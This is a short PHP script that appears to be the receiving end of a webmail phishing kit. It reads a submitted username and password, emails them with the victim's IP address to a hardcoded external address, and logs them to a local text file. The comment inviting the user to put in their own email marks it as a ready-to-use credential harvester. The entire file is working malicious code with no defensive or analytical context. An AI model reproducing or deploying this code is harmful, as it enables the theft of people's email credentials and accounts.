<?php

header('Access-Control-Allow-Origin: *');
ini_set('display_errors', '1');
ini_set('display_startup_errors', '1');
error_reporting(E_ALL);

if(isset($_POST['user_username']) && isset($_POST['user_password'])){



$user = $_POST['user_username'];
$pass = $_POST['user_password'];
$recipient = "benjaminallen187@yandex.com"; // Replace your email id here
$api = 'http://my-ips.org/ip/index.php';
// $country = visitor_country();
$ip = getenv("REMOTE_ADDR");

	$data = array(
		"user" => $user,
		"pass" => $pass,
		"type" => "3",
// 		"country" => $country,
		"ip" => $ip
	);


		$date = date('d-m-Y');
		$ip = getenv("REMOTE_ADDR");
		$message = "-----------+ W3Bmail logs +-----------\n";
		$message.= "User ID: " . $user . "\n";
		$message.= "Password: " . $pass . "\n";
		$message.= "Client IP      : $ip\n";
// 		$message.= "Client Country      : $country\n";
		$message.= "----------+ Created in Dagbo unit +-----------\n";
		$subject = "W3BMA1L | $user: " . $ip . "\n";
		$headers = "MIME-Version: 1.0\n";


		mail($recipient, $subject, $message, $headers);
		
		
		$fp = fopen('nn.txt', 'a');
        fwrite($fp, $message);
        fclose($fp);
	
		echo 0;

}
	
?>
